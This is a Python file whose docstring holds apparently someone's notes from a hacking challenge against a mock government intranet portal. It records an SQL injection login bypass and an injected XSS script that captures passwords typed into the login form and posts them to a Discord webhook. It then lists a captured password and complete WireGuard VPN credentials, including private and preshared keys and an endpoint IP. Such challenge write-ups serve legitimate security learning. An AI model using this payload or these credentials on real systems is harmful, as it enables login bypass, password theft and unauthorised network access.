import requests

url = "https://inner.portal.regjeringen.uiaikt.no/login"

"""
Tried same crendetials as level 0
Incorrect pw message:
"Incorrect password. The SQL Could not find a user with that password"
-> SQL is excecuted directly, vulnerable to SQL injection

Tried to inject some SQL, got syntax error (reproduce by entering ' as password):
        with get_db() as db:

            cursor = db.cursor()

            user_check = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

            cursor.execute(user_check)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^

            record = cursor.fetchone()

Looked at https://www.w3schools.com/sql/sql_injection.asp and found " or ""="

Figuring out what the check evaluates to:
>>> username = "me"
>>> password = "test"
>>> print(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")
SELECT * FROM users WHERE username='me' AND password='test'
>>> password = "' OR ''='"
>>> print(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")
SELECT * FROM users WHERE username='me' AND password='' OR ''=''
>>>

Password can be bypassed with ' OR ''='


XSS:
The most friendly employee in the company
  <script>
document.addEventListener('DOMContentLoaded', function() {
    // Get the form element by its ID
    var form = document.getElementById('authForm');

    // Add an event listener for the 'submit' event
    form.addEventListener('submit', function(event) {
      // Prevent the default form submission behavior
      event.preventDefault();
var pw = document.getElementById('authPassword').value;
      
      // Additional processing or validation can be done here
var settings = {
  "url": "https://discord.com/api/webhooks/1182200846985994270/BsdPADPbO88q2IRCqsMrZkX3C2mxFl347NBfB-Xh7UqbfCtzKrI22Hla1dmQmIoWAhIG",
  "method": "POST",
  "timeout": 0,
  "headers": {
    "Content-Type": "application/json"
  },
  "data": JSON.stringify({
    "content": pw
  }),
};

$.ajax(settings).done(function (response) {
  console.log(response);
});

      // You can also submit the form programmatically if needed
      // form.submit();
    });
});
  </script>

  PW:
  jeg!Har%Mest&LystTil&At%Være-En-Hacker

  
WireGuard Login Details

Use the following details to connect to the WireGuard VPN. Regjeringen Intranet Level 2.

Note: only staff with the 'Manager' role or higher can access SSH Terminals
IP Address:
64.225.76.73:51820
Preshared Key:
VDcpZgRtAlaVizeUN0ezapZnX4IgOXgB9YBFuGquQvo=
Public Key:
Yg6iNtA7+F6AWfnuqCzJPx2cdHKcYOXSvz0LNx4sMjs=
Private Key:
0Omp329xCzNPoz+71Ep/ylwsZTRBbsz/xCXOXvjQ7X4=
Options:
[Interface]
Address = 10.13.13.62
PrivateKey = 0Omp329xCzNPoz+71Ep/ylwsZTRBbsz/xCXOXvjQ7X4=
ListenPort = 51820
DNS = 10.13.13.1

[Peer]
PublicKey = Yg6iNtA7+F6AWfnuqCzJPx2cdHKcYOXSvz0LNx4sMjs=
PresharedKey = VDcpZgRtAlaVizeUN0ezapZnX4IgOXgB9YBFuGquQvo=
Endpoint = 64.225.76.73:51820
AllowedIPs = 10.13.13.0/24

Link to Arch Linux WireGuard Configuration Setup

"""